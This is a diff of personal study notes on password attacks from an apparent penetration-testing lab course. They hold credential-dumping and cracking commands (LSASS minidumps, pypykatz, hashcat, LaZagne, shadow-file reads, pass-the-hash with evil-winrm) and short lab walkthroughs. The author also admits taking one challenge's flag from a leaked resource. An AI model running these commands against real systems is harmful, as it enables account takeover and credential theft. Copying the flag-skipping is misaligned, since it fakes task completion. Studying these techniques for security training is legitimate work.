@@ -1,6 +1,6 @@
 # Password Attacks
 
-## Windows login
+# Windows login
 
 LSASS - Local Security Authority Subsystem Service is responsible for the local system security policy, user authentication, and sending security audit logs to the Event log
 
@@ -8,7 +8,7 @@ SAM Database - Contains hashed passwords on windows
 
 NTDS - Explained later
 
-## John
+# John
 
 Capable of identifying hash type in most instances. Can set rules and wordlists.&#x20;
 
@@ -16,7 +16,7 @@ Capable of identifying hash type in most instances. Can set rules and wordlists.
 
 Files - Files such as zip or shh.pub need to be converted first with the respective 2john method.
 
-## Network Services
+# Network Services
 
 CrackMapExec can be used to crack winrm smb and ssh.
 
@@ -34,7 +34,7 @@ Hydra can obvs be used to brute forcing applications like ssh or rdp
 
 Smbmap is good
 
-## Rules and mutated lists
+# Rules and mutated lists
 
 ```
 hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
@@ -42,7 +42,7 @@ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.l
 
 This module had the worse challenge I have ever seen in my life. You create a wordlist 50K plus in length and are supposed to brute force ftp to get the password. The vpn connection if not stable enough to handle multiple threads so this would take DAYS! I found this [resource ](https://www.scribd.com/document/814507639/Password-Attacks)that gives you the flag. It  is entirely unnessesary to have this challenge be so verbose. They should have given a hash to crack instead. I don't feel bad about cheating this one!
 
-## Attacking SAM
+# Attacking SAM
 
 <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
@@ -86,7 +86,7 @@ Sam stores the passwords and LSA checks them but it is possible to leak LSA pass
 
 As a side project I dumped my SAM hashes on my local machine added my password to the rockyou.txt list and cracked it!
 
-## Attacking LSASS
+# Attacking LSASS
 
 Create a dump file in task manager of Local Security Auth Process. I have LSAP protection on so I could not do this without a restart.
 
@@ -108,7 +108,7 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 
 And can use hashcat to crack these NT hashes -m 1000.
 
-## Attacking Active Directory & NTDS.dit
+# Attacking Active Directory & NTDS.dit
 
 username-anarchy can be used to generate potential usernames for names.
 
@@ -154,7 +154,7 @@ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b9
 
 It is worthy to note that it is default behaviour for accounts  to be locked out is too mnay attempts are tried so this bruteforcing attempt will not work in a real world setting.
 
-## Credential Hunting in Windows
+# Credential Hunting in Windows
 
 ```cmd-session
 start lazagne.exe all
@@ -166,7 +166,7 @@ findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 
 <figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-## Credential Hunting in Linux
+# Credential Hunting in Linux
 
 ```shell-session
 for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
@@ -193,7 +193,7 @@ tail -n5 /home/*/.bash*
 ```
 
 ```shell-session
-for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
 ```
 
 ```shell-session
@@ -206,7 +206,7 @@ This tool seraches memory for passwords needs root though
 sudo python2.7 laZagne.py all/browsers
 ```
 
-## Passwd, Shadow & Opasswd
+# Passwd, Shadow & Opasswd
 
 ```shell-session
 sudo cat /etc/security/opasswd
@@ -226,7 +226,7 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 
 For this challenge there was a shadow backup file.
 
-## Pass the Hash (PtH)
+# Pass the Hash (PtH)
 
 Windows NTLM - Passwords are not salted so PtH is possible
 
@@ -282,9 +282,9 @@ COME BACK AND FINISH THE PTH STUFF!!!!!!!!!!!!!!!!!!!
 
 
 
-## Assesment
+# Assesment
 
-### Easy
+## Easy
 
 Nmap scan shows ssh on port 22 and ftp on port 2
 
@@ -292,7 +292,7 @@ First lets try bruteforce the ftp login. And we get credentials for mike.
 
 Lets login and look around the ftp share. We find ssh keys. We use them to login and find the root password in .bash\_history. Easy!
 
-### Medium
+## Medium
 
 There is ssh on port 22 and a samba share. Running crackmap we find creds for john. john:123456
 
@@ -304,7 +304,7 @@ And we get the passoword with hashcat almost imediately.
 
 We can now login as root and get the flag!
 
-### Hard
+## Hard
 
 Nmap shows us a lot.
 
